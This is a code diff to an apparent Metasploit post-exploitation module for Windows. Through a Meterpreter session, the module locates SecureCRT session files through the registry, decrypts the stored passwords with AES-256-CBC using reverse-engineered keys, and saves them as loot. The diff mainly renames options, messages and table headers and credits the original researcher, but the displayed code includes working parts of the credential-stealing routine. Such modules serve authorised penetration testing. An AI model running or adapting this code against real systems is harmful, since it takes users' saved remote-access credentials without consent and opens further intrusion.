@@ -10,17 +10,21 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Windows Gather Securecrt Passwords',
+        'Name' => 'Windows SecureCRT Session Information Enumeration',
         'Description' => %q{
-          This module can decrypt the password of Securecrt,
-          if the user chooses to remember the password.
+          This module will determine if SecureCRT is installed on the target system and, if it is, it will try to
+          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
+          where possible, using the decryption information that HyperSine reverse engineered.
+
+          Note that whilst SecureCRT has installers for Linux, Mac and Windows, this module presently only works on Windows.
         },
         'License' => MSF_LICENSE,
         'References' => [
           [ 'URL', 'https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md']
         ],
         'Author' => [
-          'Kali-Team <kali-team[at]qq.com>'
+          'HyperSine', # Original author of the SecureCRT session description script and one who found the password decryption keys.
+          'Kali-Team <kali-team[at]qq.com>' # Metasploit module
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ]
@@ -28,7 +32,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptString.new('Passphrase', [ false, 'If the user sets the master password, e.g.:123456']),
+        OptString.new('PASSPHRASE', [ false, 'The configuration password that was set when SecureCRT was installed, if one was supplied']),
       ]
     )
   end
@@ -57,7 +61,7 @@ class MetasploitModule < Msf::Post
   def enum_session_file(path)
     config_ini = []
     tbl = []
-    print_status("Search session files on #{path}")
+    print_status("Searching for session files in #{path}")
     config_ini += session.fs.file.search(path, '*.ini')
 
     # enum session file
@@ -100,7 +104,7 @@ class MetasploitModule < Msf::Post
 
   def securecrt_crypto_v2(ciphertext)
     iv = ("\x00" * 16)
-    config_passphrase = datastore['Passphrase'] || nil
+    config_passphrase = datastore['PASSPHRASE'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
     aes = OpenSSL::Cipher.new('AES-256-CBC')
     aes.key = key
@@ -111,11 +115,12 @@ class MetasploitModule < Msf::Post
     plain_bytes_length = padded_plain_bytes[0, 4].unpack1('l') # bytes to int little-endian format.
     plain_bytes = padded_plain_bytes[4, plain_bytes_length]
     plain_bytes_digest = padded_plain_bytes[4 + plain_bytes_length, 32]
-    if (OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verity
+    if (OpenSSL::Digest::SHA256.new(plain_bytes).digest == plain_bytes_digest) # verify
       return plain_bytes.force_encoding('UTF-8')
     end
 
-    print_error('Maybe the user has set the passphrase, please try to provide the [Passphrase] to decrypt again.')
+    print_error('It seems the user set a configuration password when installing SecureCRT!')
+    print_error('If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.')
     return nil
   end
 
@@ -148,8 +153,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Gather Securecrt Passwords on #{sysinfo['Computer']}")
-    # HKEY_CURRENT_USER\Software\VanDyke\SecureCRT
+    print_status("Gathering SecureCRT session information from #{sysinfo['Computer']}")
     parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
     # get session file path
     securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + 'Sessions')
@@ -163,7 +167,7 @@ class MetasploitModule < Msf::Post
         'Password',
       ]
       tbl = Rex::Text::Table.new(
-        'Header' => 'Securecrt Password',
+        'Header' => 'SecureCRT Sessions',
         'Columns' => columns
       )
       result.each do |item|
@@ -179,8 +183,8 @@ class MetasploitModule < Msf::Post
       end
       print_line(tbl.to_s)
       if tbl.rows.count
-        path = store_loot('host.securecrt_password', 'text/plain', session, tbl, 'securecrt_password.txt', 'SecureCRT Passwords')
-        print_good("Passwords stored in: #{path}")
+        path = store_loot('host.securecrt_sessions', 'text/plain', session, tbl, 'securecrt_sessions.txt', 'SecureCRT Sessions')
+        print_good("Session info stored in: #{path}")
       end
     else
       print_error('Session path not found')
